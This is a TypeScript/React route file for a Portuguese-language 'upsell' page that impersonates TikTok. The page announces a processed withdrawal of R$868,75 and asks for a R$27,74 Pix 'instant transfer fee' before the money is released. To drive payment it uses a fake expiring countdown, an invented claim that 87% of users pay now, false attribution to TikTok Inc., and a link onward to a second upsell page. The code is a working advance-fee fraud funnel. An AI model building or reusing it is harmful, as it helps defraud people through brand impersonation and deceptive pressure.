import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { trackEvent } from "@/lib/tracking";
import { PixCheckoutModal } from "@/components/PixCheckoutModal";



export const Route = createFileRoute("/upsell-1")({
  head: () => ({
    meta: [
      { title: "Saque Solicitado | TikTok Recompensas" },
      {
        name: "description",
        content:
          "Seu saque de R$868,75 foi processado. Escolha receber agora por Transferência Instantânea ou aguardar 30 dias.",
      },
      { property: "og:title", content: "Saque Solicitado | TikTok Recompensas" },
      {
        property: "og:description",
        content: "Receba seu pagamento hoje com a Transferência Instantânea.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Upsell1,
});

function useCountdown(seconds: number) {
  const [left, setLeft] = useState(seconds);
  useEffect(() => {
    const t = setInterval(() => setLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, []);
  const m = String(Math.floor(left / 60)).padStart(2, "0");
  const s = String(left % 60).padStart(2, "0");
  return `${m}:${s}`;
}

function Upsell1() {
  const time = useCountdown(600);
  const [choice, setChoice] = useState<"now" | "wait">("now");
  const [pixOpen, setPixOpen] = useState(false);


  useEffect(() => {
    trackEvent("ViewContent", { content_name: "Upsell 1", currency: "BRL", value: 27.74 });
  }, []);



  return (
    <div className="min-h-screen bg-muted/40">
      <header className="flex items-center justify-center border-b border-border bg-background py-4">
        <span className="text-xl font-bold tracking-tight text-foreground">TikTok</span>
      </header>

      <main className="mx-auto w-full max-w-md px-4 py-8">
        <section className="rounded-2xl bg-background p-6 shadow-sm">
          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 text-3xl text-white">
            ✓
          </div>

          <h1 className="mt-5 text-center text-2xl font-bold text-foreground">
            Saque Solicitado!
          </h1>
          <p className="mt-3 text-center text-sm text-muted-foreground">
            Parabéns! A equipe do TikTok EUA processou seu pagamento de{" "}
            <strong className="text-foreground">R$868,75</strong> com sucesso e o valor será
            enviado em <strong className="text-foreground">30 dias</strong> para a conta
            cadastrada.
          </p>

          <div className="mt-6 rounded-xl bg-emerald-50 p-5 text-center">
            <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
              Seu valor de saque
            </p>
            <p className="mt-1 text-3xl font-extrabold text-foreground">R$868,75</p>
            <p className="mt-1 text-xs text-muted-foreground">
              Taxa da transferência instantânea: apenas{" "}
              <span className="font-semibold text-rose-600">1,0%</span> do valor
            </p>
          </div>

          <h2 className="mt-7 text-center text-base font-bold text-foreground">
            Como você quer receber?
          </h2>
          <p className="mt-1 text-center text-xs text-muted-foreground">
            87% dos usuários escolhem receber agora
          </p>

          <button
            type="button"
            onClick={() => setChoice("now")}
            className={`mt-4 w-full rounded-xl border-2 p-4 text-left transition-colors ${
              choice === "now" ? "border-rose-500 bg-background" : "border-border bg-background"
            }`}
          >
            <div className="flex items-start gap-3">
              <span className="flex h-9 w-9 items-center justify-center rounded-lg bg-rose-100 text-rose-600">
                ⚡
              </span>
              <div className="flex-1">
                <div className="flex items-center justify-between gap-2">
                  <span className="font-bold text-foreground">Receber Agora</span>
                  <span className="rounded-full bg-emerald-100 px-2 py-0.5 text-[10px] font-bold uppercase text-emerald-700">
                    Recomendado
                  </span>
                </div>
                <p className="mt-1 text-sm text-muted-foreground">
                  Receba seu pagamento imediatamente por Transferência Instantânea
                </p>
                <p className="mt-2 text-lg font-bold text-rose-600">
                  R$27,74{" "}
                  <span className="text-xs font-normal text-muted-foreground">(apenas 1,0%)</span>
                </p>
              </div>
            </div>
          </button>

          <button
            type="button"
            onClick={() => setChoice("wait")}
            className={`mt-3 w-full rounded-xl border-2 p-4 text-left transition-colors ${
              choice === "wait" ? "border-rose-500" : "border-border"
            } bg-background`}
          >
            <div className="flex items-start gap-3">
              <span className="flex h-9 w-9 items-center justify-center rounded-lg bg-muted">
                📅
              </span>
              <div>
                <span className="font-bold text-muted-foreground">Aguardar 30 Dias</span>
                <p className="mt-1 text-sm text-muted-foreground">
                  Processamento padrão, sem taxa adicional
                </p>
              </div>
            </div>
          </button>

          <button
            type="button"
            onClick={() => {
              trackEvent("AddToCart", { content_name: "Upsell 1", currency: "BRL", value: 27.74 });
              setPixOpen(true);
            }}
            className="mt-5 block w-full rounded-xl bg-emerald-50 p-4 text-center text-sm font-bold text-emerald-800"
          >
            Ative a Transferência Instantânea e receba hoje — taxa única de R$27,74
          </button>

          <PixCheckoutModal
            open={pixOpen}
            onClose={() => setPixOpen(false)}
            amount={27.74}
            title="Transferência Instantânea"
            nextRoute="/upsell-2"
            prefillName="Cliente"
            prefillEmail={`cliente+up1${Date.now()}@email.com`}
          />

        </section>

        <div className="mt-6 flex items-center justify-center gap-6 text-xs text-muted-foreground">
          <span>🛡️ Pagamento Seguro</span>
          <span>🔒 Transferência Protegida</span>
        </div>

        <div className="mt-4 rounded-lg bg-muted py-2 text-center text-sm text-muted-foreground">
          ⏱ Esta oferta expira em: <span className="font-bold text-rose-600">{time}</span>
        </div>

        <p className="mt-5 text-center text-[11px] text-muted-foreground">
          Processado por TikTok Inc. — uma empresa ByteDance (EIN 46-4728543)
        </p>
      </main>
    </div>
  );
}
